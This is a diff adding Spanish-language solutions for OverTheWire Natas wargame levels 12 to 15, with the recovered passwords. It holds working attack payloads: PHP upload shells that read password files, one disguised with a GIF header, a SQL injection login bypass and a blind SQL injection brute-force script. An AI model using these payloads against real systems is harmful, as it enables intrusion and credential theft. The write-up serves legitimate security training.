@@ -148,3 +148,97 @@ echo base64_encode(xor_encrypt(json_encode($defaultdata)));
 ```
 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
 ```
+
+### LVL 12
+
+```
+Creamos un archivo .php que ejecute un cat de la password del natas13. Y la subimos. La entrada no esta saneada.
+```
+
+```php
+<?php 
+echo exec("cat /etc/natas_webpass/natas13");
+?>
+```
+
+
+```
+lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+```
+
+### LVL 13
+
+```
+Es lo mismo que natas12, pero "han saneado la entrada", pero no han saneado la extension.
+```
+
+```php
+GIF8;
+<?php 
+echo exec("cat /etc/natas_webpass/natas13");
+?>
+```
+
+
+```
+qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+```
+
+### LVL 14
+
+```
+Hacemos un SQL inyection. Que cerramos las comillas para que siga la sentencia SQL y ponemos k valide la sesion si 1 = 1
+```
+
+```
+pol" OR 1 = 1 # 
+```
+
+```
+TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+```
+
+### LVL 15
+
+```
+Hice un Script para poder sacar la contraseña.
+```
+
+```python
+import requests
+import string
+
+URL= "http://natas15.natas.labs.overthewire.org/"
+
+USERNAME = "natas15"
+PASSWORD = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
+
+
+caracters = string.ascii_letters + string.digits
+i = 0
+caracterBueno = ""
+
+while True:
+    data = {
+        'username': 'natas16" AND BINARY password LIKE "' + caracterBueno + caracters[i] + '%" #'
+
+    }
+    session = requests.Session()
+    response = session.post(
+        URL,
+        data, 
+        auth=(USERNAME,PASSWORD)
+    )
+    print(caracterBueno + caracters[i])
+
+    if "This user doesn\'t exist." in response.text:
+        i = i +1
+    else:
+        caracterBueno = caracterBueno + caracters[i]
+        i = 0
+
+```
+
+```
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+```
